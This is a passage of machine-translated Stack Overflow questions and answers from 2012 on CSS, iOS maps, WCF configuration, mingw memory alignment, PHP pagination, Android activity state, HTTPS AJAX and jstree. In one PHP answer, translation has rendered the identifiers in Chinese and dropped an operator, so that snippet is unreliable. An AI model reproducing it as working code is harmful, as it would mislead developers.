    <a onclick="check(1);" id="check1" class="linkText">center please</a></center> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:00:14.490

标签“a”是内联的，内联标签没有宽度。将显示设置为块

```
<div>
    <a onclick="check(1);" id="check1" class="linkText">center please</a>
    <style>
        .linkText, .linkText:hover {
            margin: 0 auto;
            background-image: url(/images/q.png);
            width: 280px;
            background-repeat: no-repeat;
            background-color: Transparent;
            border: none;
            font-size: 18px;
            font-weight: normal !important;
            color: Black !important;
            text-shadow: none !important;
            display: -webkit-box;
            text-align: center;
            -webkit-box-align: center;
            box-align: center;
            display: table-cell; 
                    vertical-align: middle; 
                    background-color: #ccc; 
                    height: 100px;
        }
    </style>
</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T12:02:29.220

使用 display:inline-block 或 block 链接 css。As 不是块元素。

# iphone - 如何在不重新加载 MapView 的情况下重新加载 MKAnnotations？

> ID：10862117
> 
> 赞同：1
> 
> 时间：2012-06-02T11:55:23.793
> 
> 标签：iphone, ios, xcode, ios5

我有一个应用程序，它使用 Web 服务搜索有关电台的信息，然后我得到响应 JSON。但是每次我改变中心的位置时，我都必须重新加载图钉并添加新的图钉，即使它们已经在地图上。

我可以获取响应 JSON，获取要显示的信息并创建注释。问题是当我移动中心时，它会重新加载其他注释。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:00:20.553

问题是我将该方法插入到连接到 Web 服务的方法中，或者当我收到响应时......

但是我在第一行中插入了这个方法：

```
- (MKAnnotationView *)mapView:(MKMapView *)mapViewStation viewForAnnotation:(id      <MKAnnotation>)annotation

[map removeAnnotations:map.annotations];

//Code 
```

它摇摆不定。谢谢

# c# - WCF 服务的仅配置部署

> ID：10862118
> 
> 赞同：0
> 
> 时间：2012-06-02T11:55:52.457
> 
> 标签：c#, wcf, iis

我们使用许多（50 多个）WCF 服务主机（用 C# 编写，在 Win 2008R2/IIS 7.5 上运行）运行一个 Web 应用程序，以便与不同的外部供应商集成。我们想为这些主机中的每一个添加另一个服务以进行管理。该服务可以足够通用，我们可以在某个库中定义一个服务定义，我们可以从集成项目中引用该服务定义。但是有没有办法只在配置中实际添加端点？也就是说，我想避免添加 .svc 文件，而只在`web.config`服务部分添加一些行。

我尝试将此添加到`web.config`：

```
<service name="Contracts.AdminService">
  <endpoint address="AdminService" contract="Contracts.IAdminService" binding="basicHttpBinding" />
</service> 
```

但是，这不起作用。如果我添加一个像下面这样的简单`.svc`文件，它可以工作

```
<%@ ServiceHost Language="C#" Debug="true" Service="Contracts.AdminService" CodeBehind="Contracts.AdminService.cs" %> 
```

但是，我真的很想避免这种情况，这样在设置新主机时出错的可能性就会降低（我们已经用配置文件做了一堆自动的东西，所以添加一个新服务是微不足道的）。这可能吗？有什么缺点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T19:21:24.853

一段时间后自己找到了答案。解决方案是 WCF 4 的[*无文件激活*](http://msdn.microsoft.com/en-us/library/ee358764.aspx)。这让我只需将其添加到我的`web.config`：

```
<serviceHostingEnvironment aspNetCompatibilityEnabled="true"
    multipleSiteBindingsEnabled="true">
  <serviceActivations>
    <add relativeAddress="AdminService.svc" service="Contracts.AdminService"/>
  </serviceActivations>
</serviceHostingEnvironment> 
```

在此之后，我可以访问该服务`http://<hostname>/<path>/AdminService.svc`。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-03T15:11:50.640

WCF 服务托管在[ServiceHost](http://msdn.microsoft.com/en-us/library/system.servicemodel.servicehost.aspx)中。

当您不在 IIS/WAS 中托管 WCF 时，必须手动创建 ServiceHost，因为 IIS/WAS 都代表您与 ServiceHost 交互。

您在 IIS 中的 .svc 文件中所做的基本上是实例化一个新的 ServiceHost。

由于 ServiceHost 只能托管一种服务类型，因此如果您计划创建新类型的管理服务，您将需要为每种新类型提供服务主机。

因此，对您的问题的简短回答是，您不能只在 web.config 中为要创建的新服务添加一些信息，还需要一种机制来实例化 ServiceHost。

# c - 使用 mingw32 对 posix_memalign 的未定义引用

> ID：10862121
> 
> 赞同：2
> 
> 时间：2012-06-02T11:56:08.397
> 
> 标签：c, memory-management, cross-compiling, memory-alignment, mingw32

我正在使用 Debian Squeeze，使用 mingw32 交叉编译 Windows 目标。

对于 Linux 目标，我可以使用 posix_memalign 来分配对齐的内存。

我似乎无法找到一种方法让它适用于 Windows 目标；我收到有关未定义引用的错误。我尝试了几种替代功能，但无济于事。

示例代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>

int main(void)
{
    char *foo;

    /* works on linux */
    posix_memalign(&foo, 1024, 1024);

    /* deprecated linux */
    memalign(1024, 1024);
    valloc(1024);

    /* should work on windows only */
    _aligned_malloc(1024, 1024);
} 
```

Linux 目标的示例输出（预期）：

```
ben@debian6400:~/folder$ gcc --version
gcc (Debian 4.4.5-8) 4.4.5

ben@debian6400:~/folder$ gcc -std=c99 test.c
test.c: In function ‘main’:
test.c:11: warning: implicit declaration of function ‘posix_memalign’
test.c:18: warning: implicit declaration of function ‘_aligned_malloc’
/tmp/ccPwPLsW.o: In function `main':
test.c:(.text+0x55): undefined reference to `_aligned_malloc'
collect2: ld returned 1 exit status 
```

Windows 目标的示例输出——注意所有四个函数都是未定义的

```
ben@debian6400:~/folder$ i586-mingw32msvc-gcc --version
i586-mingw32msvc-gcc (GCC) 4.4.4

ben@debian6400:~/folder$ i586-mingw32msvc-gcc -std=c99 test.c
test.c: In function ‘main’:
test.c:14: warning: implicit declaration of function ‘posix_memalign’
test.c:17: warning: implicit declaration of function ‘memalign’
test.c:18: warning: implicit declaration of function ‘valloc’
test.c:21: warning: implicit declaration of function ‘_aligned_malloc’
/tmp/ccpH5Dsj.o:test.c:(.text+0x26): undefined reference to `_posix_memalign'
/tmp/ccpH5Dsj.o:test.c:(.text+0x3a): undefined reference to `_memalign'
/tmp/ccpH5Dsj.o:test.c:(.text+0x46): undefined reference to `_valloc'
/tmp/ccpH5Dsj.o:test.c:(.text+0x5a): undefined reference to `__aligned_malloc'
collect2: ld returned 1 exit status 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T12:21:34.173

您应该可以使用`_aligned_malloc`. mingw 中可能缺少其他功能。

*   更新你的 mingw。它应该在 4.6.2 中工作。
*   试试`__mingw_aligned_malloc`吧。
*   按此顺序包含您的标题：

    ```
    #include <stdlib.h>
    #include <intrin.h>
    #include <malloc.h>
    #include <windows.h> 
    ```

*   `_aligned_malloc`/`_aligned_free`只是 / 的简单`malloc`包装`free`。如果其他一切都失败了，你应该可以自己写。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-02T12:07:56.840

Gnulib 的 GNU 页面说 mingw 平台上缺少此功能，他们建议`pagealign_alloc`在这些平台上使用 Gnulib 功能。

> (8.632, posix_memalign) 某些平台缺少此功能：MacOS X 10.5、FreeBSD 6.0、NetBSD 3.0、OpenBSD 3.8、Minix 3.1.8、AIX 5.1、HP-UX 11、IRIX 6.5、OSF/1 5.1、Solaris 10、 Cygwin 1.5.x、**mingw**、MSVC 9、Interix 3.5、BeOS。

和

> Gnulib 模块 pagealign_alloc 提供了一个类似的 API，它返回在系统页面边界上对齐的内存。

[http://www.gnu.org/software/gnulib/manual/html_node/posix_005fmemalign.html](http://www.gnu.org/software/gnulib/manual/html_node/posix_005fmemalign.html)

请注意，在 C11 上，有一个名为的新函数`align_alloc`，可以指定对齐方式：

```
#include <stdlib.h>
void *aligned_alloc(size_t alignment, size_t size); 
```

# php - 如何根据循环内的信息知道何时重复循环

> ID：10862124
> 
> 赞同：0
> 
> 时间：2012-06-02T11:56:18.500
> 
> 标签：php

我是 php 新手，仍在尝试掌握这些概念。
我的问题是，如何根据仅在启动循环后可用的信息来更改是否循环？

这是我想出的代码，带有注释以尝试解释我的想法。
我基本上是在尝试为每个页面完成“业务”，如果有 1 个或多个。

注意：$object 包含可能跨越页面的结果集。如果它确实跨越页面，那么 $object->pagination 将存在，否则它将不存在。$object->pagination->pages = 总页数，$object->pagination->pages = 当前页面。

```
//get first page. some how this needs to be a loop i'm guessing.
$page = 1;
$url = "api/products/page/" . $page;
$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER,array ("Content-Type: Content-Type: application/json; charset=utf-8"));
        curl_setopt($ch, CURLOPT_HTTPHEADER,array ("Accept: application/json"));
        curl_setopt($ch, CURLOPT_USERPWD, "username-password");
        $contents = curl_exec ($ch);
        curl_close ($ch);
        $object = json_decode($contents);
//$data returned with product info and pagination info if there is more than one page.

//now check in that first page to see if there is other pages set
if(isset($object->pagination)){
        while($object->pagination->page < $object->pagination->pages) {
        $page = $page+1 ;
        //do some business
    } else {//stop going through the pages}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:11:11.513

```
<?php

$对象->分页->页面= 1；
$url = "api/products/page/" 。$对象->分页->页面；

//$url 用于 cURL。$object 如果有超过一页，则返回产品信息和分页信息。
$object //从 cURL 返回的 JSON 解码对象。

//现在检查第一页以查看是否设置了其他页面
if(isset($object->pagination)){
    while($object->pagination->page 分页->pages)
    {

        //做一些生意

        $对象->分页->页面++；
    }
}
?>

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T14:38:06.383

尝试这个：

```
if(is_array($values){
      foreach($values as $value){
         //do some  with you value
      }
}else{
  // do something with $values
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:07:25.310

我认为您的意思是遍历对象中的所有页面：

```
if (isset($object->pagination)) { 
    while ($object->pagination->page < $object->pagination->pages) { 
        $object->pagination->page++; // $x++ is the same as $x = $x+1
        //do some business 
    } 
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-06-02T12:00:30.013

这是一个例子：

```
$x = 1;

// Loop 1 through 5
while( $x <= 5 )
{
   // Output x
   echo("$x\n");

   // Check if x is a certain value and do something different
   if($x==3)
   {
      echo("Almost there...\n");
   }

   // Increment x
   $x++;
}

// This outputs...
// 1
// 2
// 3
// Almost there...
// 4
// 5 
```

# android - 活动状态未保存

> ID：10862135
> 
> 赞同：1
> 
> 时间：2012-06-02T11:58:53.477
> 
> 标签：android, android-activity

我想在活动之间滑动时保存我的活动状态，但我不能。有些东西被保存了，而另一些则没有。我认为这与我正在实施的手势监听器有关，但我不确定。

当我滑动到一个不同的活动然后回到这个活动时 - AsyncTask 仍在运行并且处理程序仍在更新 GUI，但是，我在此活动中显示的视图和按钮都处于初始配置中。

我究竟做错了什么？

```
public class Main extends Activity implements OnClickListener,
        SimpleGestureListener {
    /** Called when the activity is first created. */

    static String checkedIN = "";

    private int hoursSum;
    private int minutesSum;
    static int dayIs;
    static String madeSoFar = "";

    static int hoursCount = 0;
    static String formattedSeconds = "";
    static String formattedMinutes = "";
    public static NumberFormat formatter = new DecimalFormat("#0.00");
    static boolean killcheck = false;
    static String time = "";
    static Handler mHandler;

    private boolean clicked = false;
    private boolean wasShift = false;
    static String startString;
    static String finishString;
    private SimpleGestureFilter detector;
    private Typeface tf, tf2, roboto;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.main);

        // **************** Set Fonts **************
        roboto = Typeface.createFromAsset(getAssets(), "fonts/robotothin.ttf");
        tf = Typeface.createFromAsset(getAssets(), "fonts/Advert.ttf");
        tf2 = Typeface.createFromAsset(getAssets(), "fonts/passion.ttf");

        // **************** Gesture implementation ************

        detector = new SimpleGestureFilter(this, this);

        // **************** Date and Time Objects *************

        final Date date = new Date();
        final Date today = Calendar.getInstance().getTime();
        DateFormat DF = new SimpleDateFormat("dd/MM/yyyy");
        final String DateInString = DF.format(today);
        String myString = DateFormat.getDateInstance().format(date);
        final TextView dateDisplay = (TextView) findViewById(R.id.dateDisplay);
        dateDisplay.setText(myString);

        final DBAdapter DB = new DBAdapter(this);

        // ************* Apply custom fonts ***************

        TextView Title = (TextView) findViewById(R.id.textView2);
        Title.setTypeface(tf);
        final TextView Author = (TextView) findViewById(R.id.textView3);
        Author.setTypeface(roboto);
        TextView Current = (TextView) findViewById(R.id.textView1);
        Current.setTypeface(roboto);
        DigitalClock DG = (DigitalClock) findViewById(R.id.digitalClock1);
        DG.setTypeface(roboto);
        TextView dater = (TextView) findViewById(R.id.date);
        dater.setTypeface(roboto);
        TextView dateDisp = (TextView) findViewById(R.id.dateDisplay);
        dateDisp.setTypeface(roboto);
        CheckedTextView CV = (CheckedTextView) findViewById(R.id.radioButton1);
        CV.setTypeface(roboto);

        // *************************************************//

        final Button checkIn = (Button) findViewById(R.id.CheckIn);
        checkIn.setTypeface(roboto);
        CheckedTextView check = (CheckedTextView) findViewById(R.id.radioButton1);
        Boolean enable = false;
        check.setEnabled(enable);

        mHandler = new Handler() {

            public void handleMessage(Message msg) {

                time = "Time: " + hoursCount + ":" + formattedMinutes + ":"
                        + formattedSeconds + " Money: " + madeSoFar;

                Author.setText(time);
            }
        };

        // **************** Click Listener for first Check In Button

        checkIn.setOnClickListener(new OnClickListener() {

            int startHours;
            int startMinutes;
            int finishHours;
            int finishMinutes;

            @Override
            public void onClick(View v) {
                // Check Out
                if (clicked == true) {
                    killcheck = true;
                    checkedIN = "Check In";
                    checkIn.setText(checkedIN);
                    finishHours = Utility.getHoursTime();
                    finishMinutes = Utility.getMinutesTime();
                    finishString = Integer.toString(Utility.getHoursTime())
                            + ":" + Integer.toString(Utility.getMinutesTime())
                            + " -";

                    clicked = false;
                    wasShift = true;

                    hoursSum = finishHours - startHours;
                    minutesSum = finishMinutes - startMinutes;

                    // Check In
                } else if (clicked == false) {
                    checkedIN = "Check Out";
                    checkIn.setText(checkedIN);
                    killcheck = false;
                    new ShiftProgress().execute();
                    startHours = Utility.getHoursTime();
                    startMinutes = Utility.getMinutesTime();
                    startString = Integer.toString(Utility.getHoursTime())
                            + ":" + Integer.toString(Utility.getMinutesTime())
                            + " -";

                    String s = "In Shift ";
                    CheckedTextView radio = (CheckedTextView) findViewById(R.id.radioButton1);
                    radio.setText(s);
                    clicked = true;

                }
            }
        });

        Button addShift = (Button) findViewById(R.id.addShift);
        addShift.setTypeface(tf2);

        // **************** On click listener for adding a shift

        addShift.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                if (wasShift == true) {

                    changeDateToString(DateInString);

                    DB.open();
                    final Cursor cursor = DB.getAllShifts();
                    startManagingCursor(cursor);
                    cursor.moveToLast();
                    int count = cursor.getPosition();
                    final int position = count + 2;
                    cursor.moveToNext();

                    GregorianCalendar GC = new GregorianCalendar();

                    DB.addToDBTotal(DateInString, "Money: " + madeSoFar,
                            hoursSum, minutesSum,
                            Utility.getDay(GC.get(Calendar.DAY_OF_WEEK)),
                            position, startString, finishString);

                    DBAdapter.close();
                    wasShift = false;

                    printAny(getApplicationContext(), "Added to Shifts",
                            Toast.LENGTH_SHORT);

                } else {
                    printAny(getApplicationContext(), "Please Check In First", Toast.LENGTH_SHORT);

                }

            }
        });

    }

    // **************** METHOD DECLERATIONS ****

    public void viewShifts() {

        Intent myIntent = new Intent(Main.this, Shifts.class);

        startActivity(myIntent);
    }

    public void changeDateToString(String s) {

        Utility.INSTANCE.setDate(s);
    }

    public void changeDurationToString(String s) {

        Utility.INSTANCE.setDuration(s);
    }

    public void printAny(Context c, CharSequence s, int i) {

        Context context = c;
        CharSequence text = s;
        final int duration = i;

        Toast toast = Toast.makeText(context, text, duration);
        toast.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER, 0, 0);
        toast.show();

    }

        @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.menu, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle item selection
        switch (item.getItemId()) {
        case R.id.exit:
            System.exit(1);
            DBAdapter.close();

            return true;
        case R.id.view:
            viewShifts();
            return true;
        default:
            return super.onOptionsItemSelected(item);
        }
    }

    @Override
    public void onClick(View v) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onSwipe(int direction) {

        Intent intent = new Intent();

        switch (direction) {

        case SimpleGestureFilter.SWIPE_RIGHT:
            intent.setClass(this, Shifts.class);
            startActivity(intent);
            break;
        case SimpleGestureFilter.SWIPE_LEFT:
            intent.setClass(this, Shifts.class);
            startActivity(intent);
            break;

        }

    }

    @Override
    public boolean dispatchTouchEvent(MotionEvent me) {
        this.detector.onTouchEvent(me);
        return super.dispatchTouchEvent(me);
    }

    @Override
    public void onDoubleTap() {
        // TODO Auto-generated method stub

    }

    public class ShiftProgress extends AsyncTask<String, Integer, String> {

        @Override
        protected String doInBackground(String... params) {

            int count = 0;
            int seconds = 0;
            int minutesTime = 0;
            int minutesCount = 1;

            for (;;) {
                if (seconds % 60 == 0) {
                    minutesTime = count / 60;
                    seconds = 0;

                }

                if (seconds < 10) {

                    formattedSeconds = String.format("%02d", seconds);

                }

                else if (seconds >= 10) {

                    formattedSeconds = String.valueOf(seconds);

                }

                if (minutesTime < 10) {

                    formattedMinutes = String.format("%02d", minutesTime);

                }

                else if (minutesTime >= 10) {

                    formattedMinutes = String.valueOf(minutesTime);

                }

                if (minutesTime % 60 == 0) {
                    hoursCount = minutesCount / 60;
                    minutesTime = 0;

                }
                double sal = 40;
                double SEC = 3600;
                double salper = count * (sal / SEC);
                madeSoFar = String.valueOf(formatter.format(salper));

                try {
                    mHandler.obtainMessage(1).sendToTarget();
                    Thread.sleep(1000);
                    seconds++;
                    count++;

                } catch (InterruptedException e) {

                    e.printStackTrace();
                }
                if (killcheck) {
                    break;

                }
            }

            // int length = count /360;
            return null;
        }

        protected void onProgressUpdate(Integer... progress) {
        }

        protected void onPostExecute(Long result) {
        }

    }

    @Override
    public void onSaveInstanceState() {
        // TODO Auto-generated method stub
        Toast.makeText(this, "Activity state saved", Toast.LENGTH_LONG);
    }

    @Override
    public void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        // Restore UI state from the savedInstanceState.
        // This bundle has also been passed to onCreate.

        checkedIN = savedInstanceState.getString("checkIN");
        clicked = savedInstanceState.getBoolean("button");
        Toast.makeText(this, "Activity state Restored", Toast.LENGTH_LONG);
    }

    @Override
    public void onPause(Bundle b) {
        // TODO Auto-generated method stub
        b.putString("checkIN", checkedIN);
        b.putBoolean("button", clicked);
        Toast.makeText(this, "Activity state saved", Toast.LENGTH_LONG);
        super.onPause();
    }

    @Override
    public void onSaveInstanceState(Bundle outState) {
        outState.putString("checkIN", checkedIN);
        outState.putBoolean("button", clicked);

        Toast.makeText(this, "Activity state saved", Toast.LENGTH_LONG);

        // etc.
        super.onSaveInstanceState(outState);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Activity is getting killed", Toast.LENGTH_LONG)
                .show();
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T12:04:47.493

当您的活动被发送到后台时，您不应该让您的异步任务在后台运行。您可以随时退出您的活动，这样您就不会再引用您的活动了。

关于状态的保存，您可以查看 Activity.onRetainNonConfigurationInstance()

# c# - 如何将 http 转换为 https 的 Facebook 应用程序

> ID：10862138
> 
> 赞同：0
> 
> 时间：2012-06-02T11:59:15.990
> 
> 标签：c#, javascript, asp.net, facebook, iis

我开发了 facebook 应用程序，它默认为 http。我的管理员为 https 获取了 ssl 证书，他在 iis 7.0 上完成了他的工作。现在浏览我的 facebook 应用程序，它在 http 模式下工作。但它在 https 中无法正常工作。我通过 js 调用来自 ajax 的响应，响应没有将 ajax 发送到我的应用程序。我将路径写为“http://”，如何调用“https”。

**我的应用程序将在 http 和 https**中运行。

请给我你的价值的话。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T15:45:17.620

> 我通过 js 调用来自 ajax 的响应，响应没有将 ajax 发送到我的应用程序

对于（正常）AJAX 请求，域、协议和端口必须与页面相匹配——这称为*同源策略*。如果您的页面是通过 HTTPS 调用的，则您无法向您的域的 HTTP 版本发出 AJAX 请求。

> 我将路径写为“http://”，如何调用“https”。

完全不指定协议，浏览器自己判断是用http://还是https://

如果你不能只使用相对路径，那么给出一个没有协议的绝对路径——也就是说，`//example.com/foo/bar.php`而不是`http://example.com/foo/bar.php`（显然替换为你自己的域）。

# jquery - jstree pre1.0 fix + checkbox 插件 - 如何绑定操作？

> ID：10862147
> 
> 赞同：0
> 
> 时间：2012-06-02T12:00:16.550
> 
> 标签：jquery, plugins, checkbox, jstree

更新：我可以提醒选中的复选框，但我很难开始绑定操作，如剪切、粘贴、复制和重命名

我有一个包含菜单项的 div，在我的情况下，它们是用于创建、重命名、剪切等的图像......而不是使用上下文菜单。

```
 <li id="Events" class="label">
                <a href='#Events'><span> Events </span></a>
        <div class="sub-menu"  style="height:auto; min-height:120px; background-color:#E5E5E5">
            <div class="menu" id="menu_a" style="position:relative; margin-left:56%">
            <img src="./js/jsTree/create.png" alt="" style="cursor:pointer" id="create" title="Create" >
            <img src="./js/jsTree/rename.png" alt="" style="cursor:pointer" id="rename" title="Rename" >
            <img src="./js/jsTree/remove.png" alt="" style="cursor:pointer"  id="remove"  title="Delete">
            <img src="./js/jsTree/cut.png" alt="" style="cursor:pointer" id="cut" title="Cut" >
            <img src="./js/jsTree/copy.png" alt="" style="cursor:pointer" id="copy" title="Copy">
            <img src="./js/jsTree/paste.png" alt=""  style="cursor:pointer" id="paste" title="Paste">
            </div>

                <div id="a" class="jstree_container"></div>
        </div>

        </li>

        <!-- JavaScript neccessary for the tree -->
        <script type="text/javascript" >
           jQuery.noConflict();

        jQuery(function ($) {

        $("#a").jstree({ 
                // List of active plugins
                "plugins" : [ 
                    "themes","json_data","ui","crrm","dnd","types","hotkeys","checkbox"
                ],

        /*"ui":{select_limit:-1},       */
        "checkbox": {
            override_ui:true,
                      real_checkboxes: true,
                      real_checkboxes_names: function (n) {
                         var nid = 1;
                         $(n).each(function (data) {
                            nid = $(this).attr("nodeid");
                         });
                         return (["check_" + nid, nid]);
                      },
                      two_state: true
                   },

              themes: {"theme": "classic"},
                // This example uses JSON as it is most common
                "json_data" : { 
                    // This tree is ajax enabled - as this is most common, and maybe a bit more complex
                    // All the options are almost the same as jQuery's AJAX (read the docs)
                    "ajax" : {
                        // the URL to fetch the data
                        "url" : "./js/jsTree/server.php?user_id=jeanpaul&cat=a",
                        // the `data` function is executed in the instance's scope
                        // the parameter is the node being loaded 
                        // (may be -1, 0, or undefined when loading the root nodes)
                        "data" : function (n) { 
                            // the result is fed to the AJAX request `data` option
                            return { 
                                "operation" : "get_children", 
                                "id" : n.attr ? n.attr("id").replace("node_","") : 1 
                            }; 
                        }
                    }
                },

            })

            .bind("create.jstree", function (e, data) {
                $.post(
                    "./js/jsTree/server.php?user_id=jeanpaul&cat=a", 
                    { 
                        "operation" : "create_node", 
                        "id" : data.rslt.parent.attr("id").replace("node_",""), 
                        "position" : data.rslt.position,
                        "label" : data.rslt.name,
                        "type" : data.rslt.obj.attr("rel")
                    }, 
                    function (r) {
                        if(r.status) {
                            $(data.rslt.obj).attr("id", "node_" + r.id);
                        }
                        else {
                            $.jstree.rollback(data.rlbk);
                        }
                    }
                );

            }
            )

            .bind("remove.jstree", function (e, data) {
                data.rslt.obj.each(function () {
                    $.ajax({
                        async : false,
                        type: 'POST',
                        url: "./js/jsTree/server.php?user_id=jeanpaul&cat=a",
                        data : { 
                            "operation" : "remove_node", 
                            "id" : this.id.replace("node_","")  
                        }, 
                        success : function (r) {
                            if(!r.status) {
                                data.inst.refresh();
                                $.jstree._reference($("#a")).refresh(-1);
                            }
                        }
                    });
                });
            })

            .bind("rename.jstree", function (e, data) {

                $.post(
                    "./js/jsTree/server.php?user_id=jeanpaul&cat=a", 
                    { 
                        "operation" : "rename_node", 
                        "id" : data.rslt.obj.attr("id").replace("node_",""),  /*data.rslt.obj.attr("id").replace("node_",""),*/
                        "label" : data.rslt.new_name
                    }, 
                    function (r) {
                        if(!r.status) {
                            $.jstree.rollback(data.rlbk);
                        }
                    }
                );

            })

            .bind("move_node.jstree", function (e, data) {
                data.rslt.o.each(function (i) {
                    $.ajax({
                        async : false,
                        type: 'POST',
                        url: "./js/jsTree/server.php?user_id=jeanpaul&cat=a",
                        data : { 
                            "operation" : "move_node", 
                            "id" : $(this).attr("id").replace("node_",""), 
                            "ref" : data.rslt.cr === -1 ? 1 : data.rslt.np.attr("id").replace("node_",""), 
                            "position" : data.rslt.cp + i,
                            "label" : data.rslt.name,
                            "copy" : data.rslt.cy ? 1 : 0
                        },
                        success : function (r) {
                            if(!r.status) {
                                $.jstree.rollback(data.rlbk);
                            }
                            else {
                                $(data.rslt.oc).attr("id", "node_" + r.id);
                                if(data.rslt.cy && $(data.rslt.oc).children("UL").length) {
                                    data.inst.refresh(data.inst._get_parent(data.rslt.oc));
                                }
                            }
                        }
                    });
                });
            });

        });
        </script>
        <script type="text/javascript" >
        // Code for the menu buttons of Events
           jQuery.noConflict();
            jQuery(function ($) { 

            $("#menu_a img").click(function () {

            //makes the images to behave as links, can't use a within the li because it thinks that is an accordion menu    

                switch(this.id) {

        case "create":
                    $.jstree._reference("#a").get_checked(-1, true).each(function(index,element){
                        $("#a").jstree("create",'#'+$(element).attr("id"),"last",null);     
                        });
        break;

        case "remove":
                    $.jstree._reference("#a").get_checked(-1, true).each(function(index,element){
                        $("#a").jstree("remove",'#'+$(element).attr("id"));     
                        });
        $.jstree._reference($("#a")).refresh(-1);               
        break;

        case "rename":

                    $.jstree._reference("#a").get_checked(-1, true).each(function(index,element){           

                    $("#a").jstree("rename", '#'+$(element).attr("id"), true  );

                        });

        break;

        case "cut":
                    $.jstree._reference("#a").get_checked(-1, true).each(function(index,element){

                            $("#a").jstree("cut", '#'+$(element).attr("id")); 
                        });
        break;

        case "copy":

                    $.jstree._reference("#a").get_checked(-1, true).each(function(index,element){

                            $("#a").jstree("copy", '#'+$(element).attr("id")); 
                        });
        break;

        case "paste":

                    $.jstree._reference("#a").get_checked(-1, true).each(function(index,element){

                            $("#a").jstree("paste", '#'+$(element).attr("id")); 
                        });
        break;

                    default:
        /*for tests only */
                    $.jstree._reference("#a").get_checked(-1, true).each(function(index,element){

                        //alert($(element).attr("id"));
                            $("#a").jstree(this.id, '#'+$(element).attr("id")); 
                        });

                        break;
                }
            });
        });

        </script> 
```

我需要在这些函数中进行哪些更改才能正确绑定到选中的元素以允许对节点进行操作？

提前感谢您的任何建议。

J.P-

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-03T23:58:51.397

改变

```
.bind("change_state create.jstree") 
```

只是

```
.bind("create.jstree") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-07T16:13:01.923

```
<li id="Tasks" class="label">
    <a href='#Tasks'><span> Tasks </span></a>
    <div class="sub-menu" style="height:auto; min-height:120px; background-color:#E5E5E5">
        <div class="menu" id="menu_t" style="position:relative; margin-left:56%">
            <img src="./js/jsTree/create.png" alt="" id="create" title="Create">
            <img src="./js/jsTree/rename.png" alt="" id="rename" title="Rename">
            <img src="./js/jsTree/remove.png" alt="" id="remove" title="Delete">
            <img src="./js/jsTree/cut.png" alt="" id="cut" title="Cut">
            <img src="./js/jsTree/copy.png" alt="" id="copy" title="Copy">
            <img src="./js/jsTree/paste.png" alt="" id="paste" title="Paste">
        </div>
        <div id="t" class="jstree_container"></div>
    </div>
</li>

<!-- JavaScript neccessary for this tree : Tasks -->
<script type="text/javascript">
    jQuery.noConflict();

    jQuery(function ($) {

        $("#t").jstree({
            // List of active plugins used
            "plugins": ["themes", "json_data", "ui", "crrm", "dnd", "hotkeys", "checkbox", "contextmenu", "cookie"],

            "ui": {
                select_limit: -1,
                select_prev_on_delete: true,
            },
            "checkbox": {
                override_ui: true,
                real_checkboxes: true,
                real_checkboxes_names: function (n) {
                    var nid = 1;
                    $(n).each(function (data) {
                        nid = $(this).attr("nodeid");
                    });
                    return (["check_" + nid, nid]);
                },
                two_state: true
            },

            themes: {
                "theme": "classic"
            },
            // This example uses JSON as it is most common
            "json_data": {
                // This tree is ajax enabled - as this is most common, and maybe a bit more complex
                // All the options are almost the same as jQuery's AJAX (read the docs)
                "ajax": {
                    // the URL to fetch the data
                    "url": "./js/jsTree/server.php?user_id=jeanpaul&cat=t",
                    // the `data` function is executed in the instance's scope
                    // the parameter is the node being loaded 
                    // (may be -1, 0, or undefined when loading the root nodes)
                    "data": function (n) {
                        // the result is fed to the AJAX request `data` option
                        return {
                            "operation": "get_children",
                            "id": n.attr ? n.attr("id").replace("node_", "") : 1
                        };
                    }
                }
            }

        })

        .bind("create.jstree", function (e, data) {
            $.post(
                "./js/jsTree/server.php?user_id=jeanpaul&cat=t", {
                    "operation": "create_node",
                    "id": data.rslt.parent.attr("id").replace("node_", ""),
                    "position": data.rslt.position,
                    "label": data.rslt.name,
                    "type": data.rslt.obj.attr("rel")
                },
                function (r) {
                    if (r.status) {
                        $(data.rslt.obj).attr("id", "node_" + r.id);
                    } else {
                        $.jstree.rollback(data.rlbk);
                    }
                }
            );

        })

        .bind("remove.jstree", function (e, data) {
            data.rslt.obj.each(function () {
                $.ajax({
                    async: /*true*/ false,
                    type: 'POST',
                    url: "./js/jsTree/server.php?user_id=jeanpaul&cat=t",
                    data: {
                        "operation": "remove_node",
                        "id": this.id.replace("node_", "")
                    },
                    success: function (r) {
                        if (!r.status) {
                            data.inst.refresh();
                        }
                    }
                });
            });
        })

        .bind("rename.jstree", function (e, data) {

            data.rslt.obj.each(function () {
